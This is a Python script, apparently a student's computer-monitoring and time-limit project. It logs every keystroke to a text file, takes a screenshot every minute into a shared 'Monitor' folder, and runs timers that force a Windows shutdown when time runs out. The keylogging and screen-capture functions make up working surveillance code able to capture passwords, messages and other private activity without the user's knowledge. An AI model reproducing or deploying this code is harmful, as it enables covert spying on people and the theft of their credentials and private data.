import datetime
from pynput.keyboard import Listener
import os
import pyautogui
import threading
import time
###########---------PROCESSS: Count_15_sec ---------------##############
def Count_15_sec(datetime_start):
    while True: 
        if (datetime.datetime.now() - datetime_start).total_seconds() >= 15: 
            os.system("shutdown /s /t 1")
            break

###########---------PROCESSS: Check_1_min_left ---------------##############

def Check_1_min_left(time_end):
    check = True 
    while True:
        curtime = datetime.datetime.now()
        if (curtime-time_end).total_seconds() >= -10 and check:
            print("Time Remainning: 1 Min")
            check = False 
        else:
            if (curtime-time_end).total_seconds() >= 0:
                print("Shutting down OS")
                os.system("shutdown /s /t 1")
                #Shutting down OS
                break


#######--------SUPPORT FUNCTION FOR PROCESS: CaptureAndKeyListener -----------##########
def listen(key):
    key = str(key)
    with open("C:/Users/ASUS/OneDrive - VNU-HCMUS/Desktop/OneDrive - VNU-HCMUS/Desktop/ShareFolder/Monitor/log.txt", "a") as file: 
        file.write(key)
def KeyListener():
    with open("C:/Users/ASUS/OneDrive - VNU-HCMUS/Desktop/OneDrive - VNU-HCMUS/Desktop/ShareFolder/Monitor/log.txt", "a") as file:
        file.write('\n--------------------------------- \n')
        file.write(f'Date: {datetime.datetime.now()}\n')
        file.write('---------------------------------\n')
    with Listener(on_press = listen) as listener:
        listener.join()

def ScreenCapture():
    while True:
            s = str(datetime.datetime.now())
            s = s.replace(':', '-')
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(f"C:/Users/ASUS/OneDrive - VNU-HCMUS/Desktop/OneDrive - VNU-HCMUS/Desktop/ShareFolder/Monitor/ScreenShot/{s}.png")
            time.sleep(60)

###########---------PROCESSS: CaptureAndKeyListener ---------------##############
def CaptureAndKeyListener():
    t1 = threading.Thread(target=KeyListener)
    t2= threading.Thread(target=ScreenCapture)
    t1.start()
    t2.start()


        
